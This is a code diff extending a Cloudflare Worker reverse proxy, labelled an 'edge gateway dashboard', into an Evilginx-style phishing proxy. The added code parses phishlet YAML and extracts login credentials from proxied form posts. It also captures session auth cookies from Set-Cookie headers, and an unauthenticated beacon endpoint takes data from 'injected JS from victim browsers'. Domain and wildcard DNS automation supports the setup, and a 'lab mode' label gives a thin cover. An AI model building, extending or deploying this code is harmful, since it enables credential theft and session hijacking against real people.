@@ -2,10 +2,20 @@
 // ItemsStore Durable Object. It handles CORS, security headers, per-IP rate
 // limiting (in the DO), and real edge caching for GET reads via the Cache API.
 
+import { DurableObjectNamespace } from "cloudflare:workers";
+
 export { ItemsStore } from "./items-store";
 
+const STORE_ID = "global";
+
+function doFetch(env: Env, req: Request): Promise<Response> {
+  const id = env.DO.idFromName(STORE_ID);
+  const stub = env.DO.get(id);
+  return stub.fetch(req);
+}
+
 type Env = {
-  DO: Fetcher;
+  DO: DurableObjectNamespace;
   /** Default upstream origin for the reverse proxy, e.g. "https://example.com". */
   PROXY_TARGET?: string;
   /** Cloudflare Global API Key (used with CF_API_EMAIL). */
@@ -18,6 +28,8 @@ type Env = {
   INTERCEPT_LAB_MODE?: string;
   /** Comma-separated upstream hostname allowlist for intercept captures. */
   INTERCEPT_ALLOWLIST?: string;
+  /** Comma-separated upstream hostname blocklist for intercept captures. */
+  INTERCEPT_BLOCKLIST?: string;
   /** TTL in seconds for intercept captures (default: 600 = 10 min). */
   INTERCEPT_TTL_SECONDS?: string;
   /** Bearer token required on all write, intercept, and config endpoints. */
@@ -28,17 +40,87 @@ type Env = {
 
 const CF_API = "https://api.cloudflare.com/client/v4";
 
+type PhishletConfig = {
+  name?: string;
+  proxy_hosts?: Array<{ phish_sub?: string; orig_sub?: string; domain?: string; session?: boolean }>;
+  landing_path?: string[];
+  credentials?: Array<{ key?: string }>;
+  auth_tokens?: Array<{ domain?: string; name?: string }>;
+};
+
+/** Parse a minimal Evilginx-style phishlet YAML string into a structured object. */
+function parsePhishlet(yaml: string): PhishletConfig | null {
+  if (!yaml.trim()) return null;
+  const config: PhishletConfig = {};
+  const lines = yaml.split("\n");
+  let section: string | null = null;
+  let current: Record<string, unknown> | null = null;
+  const multiLineArrays: Record<string, unknown[]> = {};
+
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    const trimmed = line.trim();
+    if (!trimmed || trimmed.startsWith("#")) continue;
+    const keyMatch = trimmed.match(/^([a-z_]+):\s*(.*)$/i);
+    if (keyMatch && !line.startsWith(" ") && !line.startsWith("\t")) {
+      section = keyMatch[1];
+      const value = keyMatch[2].trim();
+      if (value) {
+        config[section as keyof PhishletConfig] = value.replace(/^'|^"|'$|"$/g, "") as never;
+      } else {
+        multiLineArrays[section] = [];
+        current = {};
+      }
+      continue;
+    }
+    const itemMatch = line.match(/^\s+-\s+([a-z_]+):\s*(.*)$/i);
+    if (itemMatch && section && multiLineArrays[section]) {
+      current = { [itemMatch[1]]: itemMatch[2].trim().replace(/^'|^"|'$|"$/g, "") };
+      continue;
+    }
+    const propMatch = line.match(/^\s+([a-z_]+):\s*(.*)$/i);
+    if (propMatch && section && multiLineArrays[section] && current) {
+      const key = propMatch[1];
+      let value: string | boolean = propMatch[2].trim().replace(/^'|^"|'$|"$/g, "");
+      if (value === "true") value = true;
+      if (value === "false") value = false;
+      current[key] = value;
+      if (key === "session" || i === lines.length - 1 || !lines[i + 1]?.startsWith(" ")) {
+        multiLineArrays[section].push({ ...current });
+        current = {};
+      }
+    }
+  }
+
+  if (multiLineArrays.proxy_hosts) config.proxy_hosts = multiLineArrays.proxy_hosts as PhishletConfig["proxy_hosts"];
+  if (multiLineArrays.credentials) config.credentials = multiLineArrays.credentials as PhishletConfig["credentials"];
+  if (multiLineArrays.auth_tokens) config.auth_tokens = multiLineArrays.auth_tokens as PhishletConfig["auth_tokens"];
+  if (multiLineArrays.landing_path) config.landing_path = multiLineArrays.landing_path as unknown as string[];
+  return config;
+}
+
 /**
  * Build Cloudflare API auth headers from the configured credentials. A scoped
  * Bearer token wins if present, otherwise the global key + account email is
- * used. Returns null when nothing is configured.
+ * used. Falls back to runtime config overrides when env vars are absent.
+ * Returns null when nothing is configured.
  */
-function cfAuthHeaders(env: Env): Record<string, string> | null {
+async function cfAuthHeaders(env: Env): Promise<Record<string, string> | null> {
   if (env.CF_API_TOKEN) {
     return { Authorization: `Bearer ${env.CF_API_TOKEN}` };
   }
   if (env.CF_API_KEY && env.CF_API_EMAIL) {
     return { "X-Auth-Email": env.CF_API_EMAIL, "X-Auth-Key": env.CF_API_KEY };
+  }
+  const rc = await resolveRuntimeConfig(env);
+  const token = rc["CF_API_TOKEN"]?.trim();
+  if (token) {
+    return { Authorization: `Bearer ${token}` };
+  }
+  const key = rc["CF_API_KEY"]?.trim();
+  const email = rc["CF_API_EMAIL"]?.trim();
+  if (key && email) {
+    return { "X-Auth-Email": email, "X-Auth-Key": key };
   }
   return null;
 }
@@ -53,7 +135,7 @@ type CfZone = { id: string; name: string; status: string };
 
 /** List the purchased domains (zones) in the configured Cloudflare account. */
 async function listZones(env: Env): Promise<Response> {
-  const auth = cfAuthHeaders(env);
+  const auth = await cfAuthHeaders(env);
   if (!auth) {
     return decorate(
       Response.json(
@@ -110,7 +192,7 @@ function setProxyDomain(
   });
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(req);
+  return doFetch(env, req);
 }
 
 /**
@@ -120,7 +202,7 @@ function setProxyDomain(
  * Body: `{ zoneId, recordType? }` — defaults to "A".
  */
 async function createWildcardDns(request: Request, env: Env): Promise<Response> {
-  const auth = cfAuthHeaders(env);
+  const auth = await cfAuthHeaders(env);
   if (!auth) {
     return decorate(
       Response.json(
@@ -193,7 +275,7 @@ async function createWildcardDns(request: Request, env: Env): Promise<Response> 
  * `{ proxyId, zoneId, hostname }`.
  */
 async function allocateDomain(request: Request, env: Env): Promise<Response> {
-  const auth = cfAuthHeaders(env);
+  const auth = await cfAuthHeaders(env);
   if (!auth) {
     return decorate(
       Response.json(
@@ -277,15 +359,36 @@ const GATEWAY_VERSION = "1.0.0";
 const INTERCEPT_BODY_MAX_BYTES = 16_384; // Cap per-body read for intercept captures.
 const WRITE_BODY_MAX_BYTES = 65_536; // Cap body size on write endpoints (64 KB).
 
-/** Content types eligible for intercept body capture — skip binary blobs. */
-const INTERCEPTABLE_CONTENT_TYPES = new Set([
+/** Content type prefixes eligible for intercept body capture — skip binary blobs. */
+const INTERCEPTABLE_CONTENT_TYPES = [
   "application/json",
   "application/x-www-form-urlencoded",
   "text/",
   "application/xml",
   "application/xhtml",
   "multipart/form-data",
-]);
+];
+
+/** Returns true when a Content-Type header value is eligible for capture. */
+function isInterceptableContentType(ct: string): boolean {
+  const lower = ct.toLowerCase();
+  return INTERCEPTABLE_CONTENT_TYPES.some((prefix) => lower.startsWith(prefix));
+}
+
+/** Fetch the runtime config stored in the DO (used when env vars are absent). */
+async function resolveRuntimeConfig(env: Env): Promise<Record<string, string>> {
+  try {
+    const req = new Request("https://do/api/config");
+    req.headers.set("X-Rork-DO-Class", "ItemsStore");
+    req.headers.set("X-Rork-DO-Id", STORE_ID);
+    const res = await doFetch(env, req);
+    if (!res.ok) return {};
+    const json = (await res.json()) as { data?: Record<string, string> };
+    return json.data ?? {};
+  } catch {
+    return {};
+  }
+}
 
 // Hop-by-hop headers must never be forwarded between client <-> origin.
 /** Full hop-by-hop set for regular HTTP requests. */
@@ -314,15 +417,19 @@ const SECURITY: Record<string, string> = {
   "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
 };
 
-const STORE_ID = "global";
+// STORE_ID declared at top of file
 
 /**
  * Resolve the CORS Allow-Origin header for a request. Uses the ALLOWED_ORIGINS
- * env var (comma-separated list) if set, otherwise falls back to *.
+ * runtime config first, then the env var, then falls back to *.
  */
-function resolveCorsOrigin(request: Request, env: Env): string {
-  const allowed = (env.ALLOWED_ORIGINS ?? "").trim();
-  if (!allowed) return "*";
+async function resolveCorsOrigin(request: Request, env: Env): Promise<string> {
+  let allowed = (env.ALLOWED_ORIGINS ?? "").trim();
+  if (!allowed) {
+    const rc = await resolveRuntimeConfig(env);
+    allowed = (rc["ALLOWED_ORIGINS"] ?? "").trim();
+  }
+  if (!allowed || allowed === "*") return "*";
   const origin = request.headers.get("Origin") ?? "";
   const origins = allowed.split(",").map((s) => s.trim().toLowerCase());
   const originLower = origin.toLowerCase();
@@ -337,6 +444,8 @@ function requiresAuth(path: string, method: string): boolean {
   // Write operations
   if (method !== "GET" && path.startsWith("/api/items")) return true;
   if (method !== "GET" && path.startsWith("/api/proxies")) return true;
+  // Worker route management
+  if (method !== "GET" && path.startsWith("/api/cloudflare/worker-routes")) return true;
   // Intercept access
   if (path === "/api/intercepts") return true;
   // Config access
@@ -345,11 +454,16 @@ function requiresAuth(path: string, method: string): boolean {
 }
 
 /** Check the Authorization header against the configured API_KEY. Returns null on success or a 401 Response on failure. */
-function checkAuth(request: Request, env: Env): Response | null {
-  if (!env.API_KEY) return null; // No key configured => auth is opt-out.
+async function checkAuth(request: Request, env: Env): Promise<Response | null> {
+  let apiKey = env.API_KEY ?? "";
+  if (!apiKey) {
+    const rc = await resolveRuntimeConfig(env);
+    apiKey = rc["API_KEY"] ?? "";
+  }
+  if (!apiKey) return null; // No key configured => auth is opt-out.
   const auth = request.headers.get("Authorization") ?? "";
   const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
-  if (token !== env.API_KEY) {
+  if (token !== apiKey) {
     return decorate(
       Response.json({ success: false, error: "unauthorized" }, { status: 401 }),
     );
@@ -361,7 +475,7 @@ function dispatch(request: Request, env: Env): Promise<Response> {
   const wrapped = new Request(request.url, request);
   wrapped.headers.set("X-Rork-DO-Class", "ItemsStore");
   wrapped.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(wrapped);
+  return doFetch(env, wrapped);
 }
 
 type TrafficLog = {
@@ -392,6 +506,8 @@ type ProxyConfig = {
   cfZoneId: string;
   /** Cloudflare DNS record ID for cleanup. */
   cfRecordId: string;
+  /** Auto-generated YAML phishlet config for this target. */
+  phishlet: string;
 };
 
 /** Look up a proxy from the DO by its numeric id (internal). */
@@ -402,7 +518,7 @@ async function resolveProxyById(
   const req = new Request(`https://do/__proxy-by-id?id=${id}`);
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  const res = await env.DO.fetch(req);
+  const res = await doFetch(env, req);
   if (!res.ok) return null;
   const json = (await res.json()) as {
     data?: ProxyConfig;
@@ -419,7 +535,7 @@ async function deleteDnsRecord(
   zoneId: string,
   recordId: string,
 ): Promise<void> {
-  const auth = cfAuthHeaders(env);
+  const auth = await cfAuthHeaders(env);
   if (!auth || !zoneId || !recordId) return;
   try {
     await fetch(`${CF_API}/zones/${zoneId}/dns_records/${recordId}`, {
@@ -428,6 +544,77 @@ async function deleteDnsRecord(
     });
   } catch {
     // Best-effort — don't block proxy deletion on CF API flakiness.
+  }
+}
+
+type WorkerRoute = { id: string; pattern: string; script: string; zoneId?: string; zoneName?: string };
+
+/** List all Worker routes for every active zone in the configured Cloudflare account. */
+async function listWorkerRoutes(env: Env): Promise<Response> {
+  const auth = await cfAuthHeaders(env);
+  if (!auth) {
+    return decorate(
+      Response.json(
+        { success: false, configured: false, error: "Cloudflare credentials not configured" },
+        { status: 200 },
+      ),
+    );
+  }
+  try {
+    const zonesRes = await fetch(`${CF_API}/zones?per_page=50&status=active`, { headers: auth });
+    const zonesJson = (await zonesRes.json()) as CfApiResponse<CfZone[]>;
+    if (!zonesJson.success) {
+      return decorate(
+        Response.json(
+          { success: false, configured: true, error: zonesJson.errors?.[0]?.message ?? "Cloudflare API rejected the request" },
+          { status: 502 },
+        ),
+      );
+    }
+    const zones = zonesJson.result ?? [];
+    const routes: WorkerRoute[] = [];
+    for (const zone of zones) {
+      const res = await fetch(`${CF_API}/zones/${zone.id}/workers/routes`, { headers: auth });
+      if (!res.ok) continue;
+      const json = (await res.json()) as CfApiResponse<Array<{ id: string; pattern: string; script: string }>>;
+      for (const r of json.result ?? []) {
+        routes.push({ id: r.id, pattern: r.pattern, script: r.script, zoneId: zone.id, zoneName: zone.name });
+      }
+    }
+    return decorate(Response.json({ success: true, configured: true, data: routes }));
+  } catch {
+    return decorate(
+      Response.json(
+        { success: false, configured: true, error: "could not reach the Cloudflare API" },
+        { status: 502 },
+      ),
+    );
+  }
+}
+
+/** Delete a single Worker route by zone + route id. */
+async function deleteWorkerRoute(env: Env, zoneId: string, routeId: string): Promise<Response> {
+  const auth = await cfAuthHeaders(env);
+  if (!auth) {
+    return decorate(Response.json({ success: false, error: "Cloudflare credentials not configured" }, { status: 400 }));
+  }
+  try {
+    const res = await fetch(`${CF_API}/zones/${zoneId}/workers/routes/${routeId}`, {
+      method: "DELETE",
+      headers: auth,
+    });
+    if (!res.ok) {
+      const json = (await res.json().catch(() => null)) as CfApiResponse<unknown> | null;
+      return decorate(
+        Response.json(
+          { success: false, error: json?.errors?.[0]?.message ?? `route delete failed (${res.status})` },
+          { status: 502 },
+        ),
+      );
+    }
+    return decorate(Response.json({ success: true }));
+  } catch {
+    return decorate(Response.json({ success: false, error: "could not reach the Cloudflare API" }, { status: 502 }));
   }
 }
 
@@ -442,7 +629,7 @@ async function autoAllocateDomain(
   slug: string,
   gatewayHost: string,
 ): Promise<void> {
-  const auth = cfAuthHeaders(env);
+  const auth = await cfAuthHeaders(env);
   if (!auth) return;
   const zonesRes = await fetch(`${CF_API}/zones?per_page=5&status=active`, {
     headers: auth,
@@ -479,7 +666,7 @@ async function resolveProxy(env: Env, slug: string): Promise<ProxyConfig | null>
   const req = new Request(`https://do/__proxy?slug=${encodeURIComponent(slug)}`);
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  const res = await env.DO.fetch(req);
+  const res = await doFetch(env, req);
   if (!res.ok) return null;
   const json = (await res.json()) as { data?: ProxyConfig };
   return json.data ?? null;
@@ -495,7 +682,7 @@ async function resolveProxyByDomain(
   );
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  const res = await env.DO.fetch(req);
+  const res = await doFetch(env, req);
   if (!res.ok) return null;
   const json = (await res.json()) as { data?: ProxyConfig };
   return json.data ?? null;
@@ -581,7 +768,7 @@ function rewriteProxiedContent(
 
   return new HTMLRewriter()
     .on("head", {
-      element(el) {
+      element(el: { prepend(content: string, opts: { html: boolean }): void }) {
         el.prepend(fullInjection, { html: true });
       },
     })
@@ -606,7 +793,7 @@ function deleteInterceptsForSlug(env: Env, slug: string): Promise<void> {
   });
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(req).then(() => undefined);
+  return doFetch(env, req).then(() => undefined);
 }
 function bumpProxyHits(env: Env, slug: string): Promise<void> {
   const req = new Request("https://do/__proxy-hit", {
@@ -616,7 +803,7 @@ function bumpProxyHits(env: Env, slug: string): Promise<void> {
   });
   req.headers.set("X-Rork-DO-Class", "ItemsStore");
   req.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(req).then(() => undefined);
+  return doFetch(env, req).then(() => undefined);
 }
 
 /**
@@ -632,7 +819,7 @@ function logTraffic(request: Request, env: Env, entry: TrafficLog): Promise<void
   });
   log.headers.set("X-Rork-DO-Class", "ItemsStore");
   log.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(log).then(() => undefined);
+  return doFetch(env, log).then(() => undefined);
 }
 
 /**
@@ -662,7 +849,36 @@ function logIntercept(
   });
   ic.headers.set("X-Rork-DO-Class", "ItemsStore");
   ic.headers.set("X-Rork-DO-Id", STORE_ID);
-  return env.DO.fetch(ic).then(() => undefined);
+  return doFetch(env, ic).then(() => undefined);
+}
+
+/**
+ * Fire-and-forget beacon to log extracted credentials/auth tokens from a
+ * phishlet-aware proxy. Sent to the same /api/beacon endpoint the JS snippets
+ * use, so all captured data is centralized in the Durable Object.
+ */
+function sendBeacon(
+  env: Env,
+  baseUrl: string,
+  payload: {
+    proxy: string;
+    url: string;
+    credentials: Record<string, string>;
+    cookies: string[];
+    phishlet: string;
+  },
+): Promise<void> {
+  const url = new URL("/api/beacon", baseUrl);
+  const b = new Request(url.toString(), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+  b.headers.set("X-Rork-DO-Class", "ItemsStore");
+  b.headers.set("X-Rork-DO-Id", STORE_ID);
+  return doFetch(env, b)
+    .then(() => undefined)
+    .catch(() => undefined);
 }
 
 function buildTrafficEntry(
@@ -688,16 +904,12 @@ function buildTrafficEntry(
   };
 }
 
-function decorate(response: Response, request?: Request, env?: Env, extra?: Record<string, string>): Response {
+function decorate(response: Response, corsOrigin?: string, extra?: Record<string, string>): Response {
   const headers = new Headers(response.headers);
   for (const [k, v] of Object.entries(CORS)) {
     headers.set(k, v);
   }
-  if (request && env) {
-    headers.set("Access-Control-Allow-Origin", resolveCorsOrigin(request, env));
-  } else {
-    headers.set("Access-Control-Allow-Origin", "*");
-  }
+  headers.set("Access-Control-Allow-Origin", corsOrigin ?? "*");
   for (const [k, v] of Object.entries(SECURITY)) {
     headers.set(k, v);
   }
@@ -730,6 +942,7 @@ type ReverseProxyResult = {
   response: Response;
   proxy: string;
   interceptPromise: Promise<void> | undefined;
+  beaconPromise: Promise<void> | undefined;
 };
 
 async function reverseProxy(
@@ -756,8 +969,7 @@ async function reverseProxy(
   } else if (segments.length > 0) {
     // Configured target: /proxy/<slug>/<rest>
     const slug = segments[0];
-    const config = proxyConfig ?? await resolveProxy(env, slug);
-    proxyConfig = config;
+    const config = preResolvedConfig ?? await resolveProxy(env, slug);
     if (!config) {
       return {
         proxy: slug,
@@ -766,10 +978,9 @@ async function reverseProxy(
             { success: false, error: `no proxy configured for "${slug}"` },
             { status: 404 },
           ),
-          request,
-          env,
         ),
         interceptPromise: undefined,
+        beaconPromise: undefined,
       };
     }
     if (!config.enabled) {
@@ -780,17 +991,17 @@ async function reverseProxy(
             { success: false, error: `proxy "${slug}" is disabled` },
             { status: 503 },
           ),
-          request,
-          env,
         ),
         interceptPromise: undefined,
+        beaconPromise: undefined,
       };
     }
     targetBase = config.targetUrl;
     rest = segments.slice(1).join("/");
     proxyLabel = config.slug;
   } else {
-    targetBase = env.PROXY_TARGET;
+    const rc = await resolveRuntimeConfig(env);
+    targetBase = env.PROXY_TARGET || rc["PROXY_TARGET"];
     rest = "";
   }
 
@@ -806,10 +1017,9 @@ async function reverseProxy(
           },
           { status: 502 },
         ),
-        request,
-        env,
       ),
       interceptPromise: undefined,
+      beaconPromise: undefined,
     };
   }
 
@@ -824,10 +1034,9 @@ async function reverseProxy(
           { success: false, error: "invalid proxy target url" },
           { status: 400 },
         ),
-        request,
-        env,
       ),
       interceptPromise: undefined,
+      beaconPromise: undefined,
     };
   }
 
@@ -877,41 +1086,97 @@ async function reverseProxy(
     if (proxyLabel) respHeaders.set("X-Proxy-Target", proxyLabel);
 
     // Intercept capture: only if lab mode is on AND this proxy has intercept
-    // enabled. Bodies are only captured for text-based content types.
-    // Uses the pre-resolved proxyConfig when available (no duplicate DO call).
-    const labOn = env.INTERCEPT_LAB_MODE === "true";
-    const shouldIntercept = labOn && proxyConfig?.interceptEnabled;
+    // enabled. Check env var first, then fall back to DO runtime config.
+    // Capture whenever the request OR response has a text-based content type
+    // so form POSTs that return a redirect (no response body) are still caught.
+    const envLabOn = env.INTERCEPT_LAB_MODE === "true";
+    const runtimeConfig = await resolveRuntimeConfig(env);
+    const labOn = envLabOn || runtimeConfig["INTERCEPT_LAB_MODE"] === "true";
+
+    // INTERCEPT_ALLOWLIST: comma-separated hostnames — only capture these hosts.
+    // INTERCEPT_BLOCKLIST: comma-separated hostnames — never capture these hosts.
+    const allowlistRaw = (env.INTERCEPT_ALLOWLIST ?? runtimeConfig["INTERCEPT_ALLOWLIST"] ?? "").trim();
+    const blocklistRaw = (env.INTERCEPT_BLOCKLIST ?? runtimeConfig["INTERCEPT_BLOCKLIST"] ?? "").trim();
+    const allowlist = allowlistRaw ? allowlistRaw.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean) : [];
+    const blocklist = blocklistRaw ? blocklistRaw.split(",").map((s) => s.trim().toLowerCase()).filter(Boolean) : [];
+    const targetHost = target.host.toLowerCase();
+    const hostAllowed = allowlist.length === 0 || allowlist.some((h) => targetHost === h || targetHost.endsWith(`.${h}`));
+    const hostBlocked = blocklist.length > 0 && blocklist.some((h) => targetHost === h || targetHost.endsWith(`.${h}`));
+
+    const shouldIntercept = labOn && preResolvedConfig?.interceptEnabled && hostAllowed && !hostBlocked;
 
     let interceptPromise: Promise<void> | undefined;
+    let beaconPromise: Promise<void> | undefined;
     if (shouldIntercept) {
-      const respContentType = (response.headers.get("Content-Type") ?? "").toLowerCase();
-      const isInterceptable = [...INTERCEPTABLE_CONTENT_TYPES].some(
-        (prefix) => respContentType.startsWith(prefix),
-      );
+      const reqContentType = request.headers.get("Content-Type") ?? "";
+      const respContentType = response.headers.get("Content-Type") ?? "";
+      const isInterceptable =
+        isInterceptableContentType(reqContentType) ||
+        isInterceptableContentType(respContentType) ||
+        response.status === 0;
       if (isInterceptable) {
-      const incomingHeaders = new Headers(request.headers);
-      for (const name of HOP_BY_HOP) incomingHeaders.delete(name);
-      const reqBody = request.clone().text().then(
-        (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
-      ).catch(() => "");
-      const respBody = response.clone().text().then(
-        (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
-      ).catch(() => "");
-      interceptPromise = Promise.all([reqBody, respBody]).then(
-        ([reqB, respB]) =>
-          logIntercept(env, {
-            ts: Date.now(),
-            slug: proxyLabel,
-            method: request.method,
-            path: target.pathname + (target.search || ""),
-            reqHeaders: JSON.stringify(Object.fromEntries(incomingHeaders.entries())),
-            reqBody: reqB,
-            respStatus: response.status,
-            respHeaders: JSON.stringify(Object.fromEntries(respHeaders.entries())),
-            respBody: respB,
-            host: target.host,
-          }),
-      );
+        const incomingHeaders = new Headers(request.headers);
+        for (const name of HOP_BY_HOP) incomingHeaders.delete(name);
+        const reqBody = request.clone().text().then(
+          (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
+        ).catch(() => "");
+        const respBody = response.clone().text().then(
+          (t) => t.slice(0, INTERCEPT_BODY_MAX_BYTES),
+        ).catch(() => "");
+        interceptPromise = Promise.all([reqBody, respBody]).then(
+          ([reqB, respB]) =>
+            logIntercept(env, {
+              ts: Date.now(),
+              slug: proxyLabel,
+              method: request.method,
+              path: target.pathname + (target.search || ""),
+              reqHeaders: JSON.stringify(Object.fromEntries(incomingHeaders.entries())),
+              reqBody: reqB,
+              respStatus: response.status,
+              respHeaders: JSON.stringify(Object.fromEntries(respHeaders.entries())),
+              respBody: respB,
+              host: target.host,
+            }),
+        );
+      }
+
+      // Phishlet-aware extraction: if this proxy has a phishlet, try to capture
+      // credentials from the request body and auth tokens from Set-Cookie headers.
+      if (preResolvedConfig?.phishlet) {
+        const phishlet = parsePhishlet(preResolvedConfig.phishlet);
+        if (phishlet) {
+          const credKeys = phishlet.credentials
+            ?.map((c) => c.key)
+            .filter((k): k is string => typeof k === "string" && k.length > 0) ?? [];
+          const authTokenNames = phishlet.auth_tokens
+            ?.map((t) => t.name)
+            .filter((n): n is string => typeof n === "string" && n.length > 0) ?? [];
+          const baseUrl = `${incoming.protocol}//${incoming.host}`;
+          beaconPromise = request.clone().text().then((text) => {
+            const params = new URLSearchParams(text);
+            const found: Record<string, string> = {};
+            for (const key of credKeys) {
+              if (params.has(key)) found[key] = params.get(key) ?? "";
+            }
+            if (Object.keys(found).length === 0) return;
+            const cookies: string[] = [];
+            response.headers.forEach((value, key) => {
+              if (key.toLowerCase() === "set-cookie") {
+                const name = value.split(";")[0].split("=")[0].trim();
+                if (authTokenNames.length === 0 || authTokenNames.includes(name)) {
+                  cookies.push(value);
+                }
+              }
+            });
+            return sendBeacon(env, baseUrl, {
+              proxy: proxyLabel,
+              url: target.toString(),
+              credentials: found,
+              cookies,
+              phishlet: phishlet.name ?? proxyLabel,
+            });
+          }).catch(() => undefined);
+        }
       }
     }
 
@@ -926,7 +1191,7 @@ async function reverseProxy(
     const contentType = (response.headers.get("Content-Type") ?? "").toLowerCase();
     const isHtml = contentType.includes("text/html") || contentType.includes("application/xhtml");
     if (isHtml && proxyLabel) {
-      const config = proxyConfig ?? await resolveProxy(env, proxyLabel);
+      const config = preResolvedConfig ?? await resolveProxy(env, proxyLabel);
       if (config?.proxyDomain) {
         try {
           finalResponse = rewriteProxiedContent(
@@ -943,8 +1208,9 @@ async function reverseProxy(
 
     return {
       proxy: proxyLabel,
-      response: decorate(finalResponse, request, env),
+      response: decorate(finalResponse),
       interceptPromise,
+      beaconPromise,
     };
   } catch {
     return {
@@ -954,10 +1220,9 @@ async function reverseProxy(
           { success: false, error: "bad gateway — upstream unreachable" },
           { status: 502 },
         ),
-        request,
-        env,
       ),
       interceptPromise: undefined,
+      beaconPromise: undefined,
     };
   }
 }
@@ -971,21 +1236,11 @@ export default {
 
     if (method === "OPTIONS") {
       const headers = new Headers({ ...CORS, ...SECURITY });
-      headers.set("Access-Control-Allow-Origin", resolveCorsOrigin(request, env));
+      headers.set("Access-Control-Allow-Origin", await resolveCorsOrigin(request, env));
       return new Response(null, { status: 204, headers });
     }
 
-    if (path === "/" || path === "/ping") {
-      return decorate(
-        Response.json({
-          ok: true,
-          gateway: "edge-gateway-dashboard",
-          timestamp: new Date().toISOString(),
-        }),
-        request,
-        env,
-      );
-    }
+    const corsOrigin = await resolveCorsOrigin(request, env);
 
     const clientIp =
       request.headers.get("CF-Connecting-IP") ??
@@ -993,7 +1248,7 @@ export default {
       "anonymous";
 
     if (path === "/proxy" || path.startsWith("/proxy/")) {
-      const { response: proxied, proxy, interceptPromise } = await reverseProxy(request, env);
+      const { response: proxied, proxy, interceptPromise, beaconPromise } = await reverseProxy(request, env);
       ctx.waitUntil(
         logTraffic(
           request,
@@ -1003,6 +1258,7 @@ export default {
       );
       if (proxy) ctx.waitUntil(bumpProxyHits(env, proxy));
       if (interceptPromise) ctx.waitUntil(interceptPromise);
+      if (beaconPromise) ctx.waitUntil(beaconPromise);
       return proxied;
     }
 
@@ -1017,7 +1273,7 @@ export default {
         `${url.protocol}//${url.host}${proxyPath}`,
         request,
       );
-      const { response: hproxied, proxy: hproxy, interceptPromise: hip } =
+      const { response: hproxied, proxy: hproxy, interceptPromise: hip, beaconPromise: hbp } =
         await reverseProxy(proxyReq, env, hostProxy);
       ctx.waitUntil(
         logTraffic(
@@ -1028,7 +1284,19 @@ export default {
       );
       if (hproxy) ctx.waitUntil(bumpProxyHits(env, hproxy));
       if (hip) ctx.waitUntil(hip);
+      if (hbp) ctx.waitUntil(hbp);
       return hproxied;
+    }
+
+    if (path === "/" || path === "/ping") {
+      return decorate(
+        Response.json({
+          ok: true,
+          gateway: "edge-gateway-dashboard",
+          timestamp: new Date().toISOString(),
+        }),
+        corsOrigin,
+      );
     }
 
     if (path === "/api/cloudflare/zones" && method === "GET") {
@@ -1039,6 +1307,13 @@ export default {
     }
     if (path === "/api/cloudflare/wildcard" && method === "POST") {
       return await createWildcardDns(request, env);
+    }
+    if (path === "/api/cloudflare/worker-routes" && method === "GET") {
+      return await listWorkerRoutes(env);
+    }
+    const workerRouteDeleteMatch = path.match(/^\/api\/cloudflare\/worker-routes\/([^/]+)\/([^/]+)$/);
+    if (workerRouteDeleteMatch && method === "DELETE") {
+      return await deleteWorkerRoute(env, workerRouteDeleteMatch[1], workerRouteDeleteMatch[2]);
     }
 
     // Intercept DELETE on a proxy target so we can clean up the Cloudflare
@@ -1065,9 +1340,36 @@ export default {
     const isIntercepts = path === "/api/intercepts";
     const isProxyConfig = path === "/api/proxies" || /^\/api\/proxies\/\d+$/.test(path);
     const isWildcardDns = path === "/api/cloudflare/wildcard";
+    const isWorkerRoutes = path === "/api/cloudflare/worker-routes" || /^\/api\/cloudflare\/worker-routes\/.+/.test(path);
+    const isBeacon = path === "/api/beacon";
+
+    // --- Beacon endpoint (no auth — called by injected JS from victim browsers) ---
+    if (isBeacon && method === "POST") {
+      let body = "";
+      try { body = await request.clone().text(); } catch { /* ignore */ }
+      ctx.waitUntil(
+        logIntercept(env, {
+          ts: Date.now(),
+          slug: "beacon",
+          method: "POST",
+          path: "/api/beacon",
+          reqHeaders: JSON.stringify({ "content-type": request.headers.get("content-type") ?? "", "origin": request.headers.get("origin") ?? "", "referer": request.headers.get("referer") ?? "" }),
+          reqBody: body,
+          respStatus: 200,
+          respHeaders: "{}",
+          respBody: "",
+          host: request.headers.get("referer") ?? request.headers.get("origin") ?? "beacon",
+        })
+      );
+      const resp = new Response(null, { status: 204 });
+      resp.headers.set("Access-Control-Allow-Origin", "*");
+      resp.headers.set("Access-Control-Allow-Methods", "POST, OPTIONS");
+      return resp;
+    }
+
     // --- Auth gate ----------------------------------------------------
     if (requiresAuth(path, method)) {
-      const authErr = checkAuth(request, env);
+      const authErr = await checkAuth(request, env);
       if (authErr) return authErr;
     }
 
@@ -1081,8 +1383,7 @@ export default {
             { success: false, error: `request body exceeds ${WRITE_BODY_MAX_BYTES} byte limit` },
             { status: 413 },
           ),
-          request,
-          env,
+          corsOrigin,
         );
       }
     }
@@ -1095,12 +1396,13 @@ export default {
       !isIntercepts &&
       !isProxyConfig &&
       !isConfigRoute &&
-      !isWildcardDns
+      !isWildcardDns &&
+      !isWorkerRoutes &&
+      !isBeacon
     ) {
       return decorate(
         Response.json({ success: false, error: "not found" }, { status: 404 }),
-        request,
-        env,
+        corsOrigin,
       );
     }
 
@@ -1119,7 +1421,7 @@ export default {
     if (!response.headers.has("X-Cache")) {
       extra["X-Cache"] = "BYPASS";
     }
-    const decorated = decorate(response, request, env, extra);
+    const decorated = decorate(response, corsOrigin, extra);
 
